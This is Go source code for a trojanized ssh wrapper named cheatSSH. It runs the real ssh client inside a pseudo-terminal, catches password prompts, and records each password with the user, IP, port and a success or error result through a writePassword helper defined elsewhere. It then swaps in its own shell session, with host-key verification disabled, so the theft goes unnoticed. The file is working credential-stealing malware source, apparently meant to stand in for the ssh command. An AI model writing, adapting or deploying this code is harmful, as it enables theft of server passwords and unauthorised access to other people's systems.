package main

import (
	"fmt"
	"github.com/google/goterm/term"
	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"syscall"
	"time"
)

//var SSHIgnore = regexp.MustCompile("not a terminal")
var SSHAsk = regexp.MustCompile(`(assword.*:)|(attempts)|(密码.*:)|(重试)|(错误)`)
var SSHAskEnd = regexp.MustCompile(`(: $)|(：$)`)
var SSHSuccess = regexp.MustCompile(`(Welcome to)|(Last login)|(Last failed login)`)
var SSHIfFirst = regexp.MustCompile(`^(The authenticity)`)

func cheatSSH() {
	var pty, err = term.OpenPTY()
	if err != nil {
		execScript(cmd)
		return
	}
	var user, password, ip, port string
	var writeMsg = make(chan struct{})
	var readLock = make(chan struct{})
	var AskPass bool
	c := exec.Command("ssh", os.Args[1:]...)
	c.Stdout = pty.Slave
	c.Stdin = pty.Slave
	c.Stderr = pty.Slave
	c.SysProcAttr = &syscall.SysProcAttr{
		Setsid:  true,
		Setctty: true}
	c.Start()

	go func() {
		for {
			<-writeMsg
			password = getPassword()
			pty.Master.WriteString(password + "\r\n")
		}

	}()
	var lineByte []byte
	var line string
	var FirstTime bool
	go func() {
		for {
			v, err := pty.ReadByte()
			if err != nil || v == 0 {
				readLock <- struct{}{}
				return
			}

			lineByte = append(lineByte, v)
			line = string(lineByte)
			//fmt.Println(line,line[len(line)-1])

			//判断是否需要指纹交互
			if FirstTime && strings.HasSuffix(line, "?") {
				var input string
				fmt.Print(line)
				fmt.Scanln(&input)
				pty.Master.WriteString(input + "\r\n")
				line = ""
				lineByte = nil
				FirstTime = false
				continue
			}

			if v == 13 || v == 10 {
				//根据第一行判断是否为指纹识别模式
				if SSHIfFirst.MatchString(line) {
					AskPass = true
					FirstTime = true
				}
				//若不是指纹识别模式和密码模式
				if !FirstTime && !AskPass && !SSHAsk.MatchString(line) && strings.TrimSpace(line) != "" {
					readLock <- struct{}{}
					return
				}
				if password != "" && strings.TrimSpace(line) != "" {
					if user == "" || ip == "" || port == "" {
						user, ip, port = getSSHInfo()
					}
					prefix := user + " " + ip + " " + port
					if SSHSuccess.MatchString(line) {
						writePassword(prefix + " " + password + " success")
						c.Process.Kill()
						readLock <- struct{}{}
						return
					} else {
						writePassword(prefix + " " + password + " error")
						password = ""
					}
				}
				//AskPass = true
				fmt.Print(line)
				lineByte = nil
				line = ""
				continue
			}

			//询问密码语句输出
			if line != "" && SSHAsk.MatchString(line) && SSHAskEnd.MatchString(line) {
				AskPass = true
				fmt.Print(line)
				lineByte = nil
				line = ""
				writeMsg <- struct{}{}
				//去除输入的换行符
				//pty.ReadByte()
			}
		}
	}()
	c.Wait()
	if AskPass {
		time.Sleep(time.Second / 2)
	}
	pty.Close()
	<-readLock

	if AskPass && password != "" {
		startSSHShell(user, password, ip, port)
	}
	if !AskPass && password == "" {
		execScript(cmd)
	}
}
func getSSHInfo() (string, string, string) {
	var user, ip, port string
	infoRE := regexp.MustCompile(`\s(.+?)@(\d+\.\d+\.\d+\.\d+)`)
	info := infoRE.FindAllStringSubmatch(strings.Join(os.Args, " "), 1)
	portRE := regexp.MustCompile(`-p\s+(\d+)`)
	portInfo := portRE.FindAllStringSubmatch(strings.Join(os.Args, " "), 1)
	if len(info[0]) == 3 {
		user = info[0][1]
		ip = info[0][2]
	} else {
		return "", "", ""
	}
	if len(portInfo) == 0 {
		port = "22"
	} else if len(portInfo[0]) == 2 {
		port = portInfo[0][1]
	} else {
		return "", "", ""
	}
	return user, ip, port
}
func startSSHShell(user string, password string, ip string, port string) {

	client, err := ssh.Dial("tcp", ip+":"+port, &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	})
	checkErr(err)
	session, err := client.NewSession()
	defer session.Close()
	fd := int(os.Stdin.Fd())
	oldState, err := terminal.MakeRaw(fd)
	checkErr(err)
	defer terminal.Restore(fd, oldState)
	// 拿到当前终端文件描述符
	termWidth, termHeight, err := terminal.GetSize(fd)
	// request pty
	err = session.RequestPty("xterm-256color", termHeight, termWidth, ssh.TerminalModes{})
	checkErr(err)
	// 对接 std
	session.Stdout = os.Stdout
	session.Stderr = os.Stderr
	session.Stdin = os.Stdin

	err = session.Shell()
	err = session.Wait()

}
